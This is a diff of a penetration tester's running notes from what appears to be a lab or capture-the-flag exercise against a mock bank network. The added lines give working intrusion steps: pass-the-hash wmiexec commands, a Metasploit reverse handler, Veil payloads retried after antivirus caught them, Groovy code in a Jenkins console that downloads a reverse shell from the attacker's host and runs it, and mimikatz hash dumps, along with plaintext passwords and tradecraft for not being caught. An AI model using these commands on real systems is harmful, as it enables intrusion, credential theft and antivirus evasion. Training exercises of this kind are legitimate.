@@ -1,3 +1,17 @@
+* Commands
+
+./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20
+
+reverse handler:
+msfconsole -x "use exploit/multi/handler;\
+> set RHOST 10.59.4.100;\
+> set LPORT 443;\
+> run"
+
+John
+john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2 
+
+
 * Challenge 1
 
 Can you find Alice's password? Note refer to the attached responder output.
@@ -16,7 +30,6 @@ john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2
 *Elefant15*        (alice)
 
 1g 0:00:00:08 DONE (2019-06-27 10:59) 0.1145g/s 1282Kp/s 1282Kc/s 1282KC/s Eliseulove..Edward14.
-
 
 * Challenge 2 
 
@@ -181,12 +194,12 @@ https://jenkins.io/security/advisory/2018-12-05/
 10.59.4.*
 .14 - jenkins server
 .13 - 
-.20 - Alice, windows 8.1
-.21 - Bob - cannot run meterpreter
+.20 - Alice, windows 8.1 - got password
+.21 - Bob 
 .22 - Charles - cannot run meterpreter
 .23 - D - dave
 .24 - E Edward - windows 8.1 9600
-.25 - windows, fred -
+.25 - windows, fred - got password
  + Fred: WildFred8300
 
 ** Timeline 
@@ -295,7 +308,7 @@ md5 reverse of '5033b55c74e5c56686f25bb6f2d21f79' == funkeymonkey124
 -> worked for Federico in Vault
 -> username = admin, password was funkeymonkey124
 
-OS on the .13 machine is Ubuntu 16.04 LTS
+OS on the .13 machine (Tomcat + Vault) is Ubuntu 16.04 LTS
 
 *** ssh passphrase in the vault
 Aiwaib6s
@@ -310,33 +323,191 @@ Windows Server 2012 R2
 user.name	DEV_SERVER$
 10.59.4.12
 
-** Observations from day 1
+* Observations from day 1
 
 *** Better notekeeping - shared notes
 *** Better oversight of getting to the goal
 *** Keep track of 
 
-* Challenge 4
+** Veil evasion output
+ [*] Language: powershell
+ [*] Payload Module: powershell/meterpreter/rev_tcp
+ [*] PowerShell doesn't compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/CutePuppy.bat
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/CutePuppy.rc
 
-** Description
-Tomcat password
 
-Can you get the Tomcat manager password?
+9:07
+Running nmap against .12
 
-* Challenge 5
-** Description
+**** nmap output 10.59.4.12
+oot@kali:~/Downloads/22-c# nmap -sV 10.59.4.12
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 09:07 UTC
+Nmap scan report for 10.59.4.12
+Host is up (0.10s latency).
+Not shown: 989 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+49165/tcp open  msrpc              Microsoft Windows RPC
+MAC Address: 00:16:3E:3B:70:A9 (Xensource)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-Bob's password
-What is Bob's password?
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.38 seconds
 
-* Challenge 6
-** Description
-Edward's passphrase
 
-What is the passphrase of Edward's ssh private key?
+9:12 - uploaded CutePuppy.bat to .21
+tried to ~type~ the batch file, but it says 
+Operation did not complete successfully because the file contains a virus or potentially unwanted software.
 
-* Challenge 7
-** Description
-Fred's password
+9:15 - generated a new one, with c# - seesaw.exe
+9:21 - uploaded to the machine .21
+9:21 - file disappeared after execution again (antivirus)
 
-What is Fred's password to get onto the crypto server?
+9:23 - generating new one with Veil - C
+9:25 - caught by AV again
+
+ slave
+Running as a SYSTEM
+
+JVM post-exploitation one-liners
+https://gist.github.com/frohoff/a976928e3c1dc7c359f8
+http://localhost:8080/reverse-443.exe
+
+Host
+
+*** Groovy code in Jenkins console
+
+def remoteUrl = "http://10.59.4.100:8080/reverse-443.exe"
+def file = new FileOutputStream("c:\\reverse-443.exe")
+def out = new BufferedOutputStream(file)
+out << new URL(remoteUrl).openStream()
+out.close()
+
+execute with 
+println "c:\\reverse-2.exe".execute().text
+
+Now we got a metasploit console at 9:40
+~getsystem~
+
+load mimikatz, then
+meterpreter > mimikatz_command -f samdump::hashes
+Ordinateur : dev_server.insecurebank.local
+BootKey    : 9e74a3487fcd17ded74f711fed041904
+
+Administrator hash
+
+Rid  : 500
+User : Administrator
+LM   : 
+NTLM : e6aaafea4f9a779c5049081370e0bcbb
+
+Rid  : 501
+User : Guest
+LM   : 
+NTLM : 
+
+Rid  : 1004
+User : DEV_Admin
+LM   : 
+NTLM : fc0d2496db1c6fb501843b767d5cfd08
+
+Rid  : 1005
+User : olaf
+LM   : 
+NTLM : b222c55cf18c19101c1f49ba99e634e0
+
+Jenkins slave - used groovy script console to download a reverse shell,
+then used script console to execute the reverse shell
+Then ran mimikatz in meterpreter to obtain samdump
+
+
+** Looking into the .3 network
+
+root@kali:~/Downloads# nmap -sn 10.59.3.0-255
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 10:18 UTC
+Nmap scan report for 10.59.3.5
+Host is up (0.0079s latency).
+Nmap scan report for 10.59.3.8
+Host is up (0.0067s latency).
+Nmap scan report for 10.59.3.9
+Host is up (0.0074s latency).
+Nmap scan report for 10.59.3.10
+Host is up (0.0066s latency).
+
+*** Fred's password - 
+rjgobM46@xLVZ4iq12Eo7FTFeL
+
+
+10.59.4.17
+
+10:43 - started scan of the 10.59.5.*
+root@kali:~/Downloads# nmap -sP 10.59.5.0-255
+Nmap done: 256 IP addresses (0 hosts up) scanned in 206.29 seconds
+
+Yesterday 
+
+Mimikatz:
+if getting https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module
+
+Pass the hash with ntlm:
+./wmiexec.py -hashes :fc0d2496db1c6fb501843b767d5cfd08 insecurebank\dev_admin@10.59.4.17
+did't work as dev_admin is likely only a local account
+
+*** domain users
+running ~net user /domain~ on .12
+c:\Program Files\Java\jre-10.0.1\bin>net user /domain
+net user /domain
+The request will be processed at a domain controller for domain insecurebank.local.
+
+
+User accounts for \\DC1.insecurebank.local
+
+-------------------------------------------------------------------------------
+Administrator            alice                    bob                      
+charles                  dave                     edward                   
+fred                     Guest                    krbtgt                   
+The command completed with one or more errors.
+
+*** second administrator
+
+./wmiexec.py -hashes :e6aaafea4f9a779c5049081370e0bcbb administrator@10.59.4.17
+-> logon failure
+
+* Machines on the network
+
+.11 - kerberos, AD
+.12 - Jenkins slave, reverse root shell
+.13 - Apache Tomcat - vault, reverse root shell
+.14 - Jenkins - shell, 
+.15 - vnc, x11 - ** TODO
+.16 - Windows server, RDP, netbios
+.17 - windows server, RDP, netbios
+
+** 10.59.4.16 - Windows Server
+11:27 - connected via wmiexec using admin and the above hash
+
+** Jenkins 
+
+we connected via a simple reverse shell with groovy script pasted in Jenkins shell
+Then were able to look into ~ (jenkins home) directory
+
+** Cobalt strike
++ Used by APT and Red Team
++ Has a built in C2
++ Windows based implant
++ Includes pivoting features
++ Implants include mimikatz & psexec/wmiexec
+
++ Used when a system is already compromised
++ Shouldn't drop it as a first thing, go step by step, if they catch you, then you will burn your tools
++ The main idea is to start like a script kiddie (something basic), then if it fails, go to the next weapon
